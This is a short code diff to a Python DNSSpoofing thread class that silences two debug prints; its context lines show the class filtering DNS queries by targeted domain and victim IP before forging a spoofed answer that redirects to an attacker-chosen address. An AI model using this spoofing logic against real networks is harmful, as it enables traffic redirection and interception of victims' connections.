@@ -63,11 +63,11 @@ class DNSSpoofing(threading.Thread):
             # Packet destination a domain name that should be spoofed?
             if not (received_packet[DNSQR].qname.decode("utf8")[:-1] in self.domain_names):
                 # TODO: Either remove or this logging or make it conditional
-                print(f"{received_packet[DNSQR].qname.decode('utf8')[:-1]} not a targeted Domain")
+                #print(f"{received_packet[DNSQR].qname.decode('utf8')[:-1]} not a targeted Domain")
                 return
             # Packet sent by a target host?
             if not (received_packet[IP].src in self.victims):
-                print("not a targeted victim")
+                #print("not a targeted victim")
                 return
 
             spoofed_ans = create_spoofed_dns_answer(self.redirect_ip, received_packet)
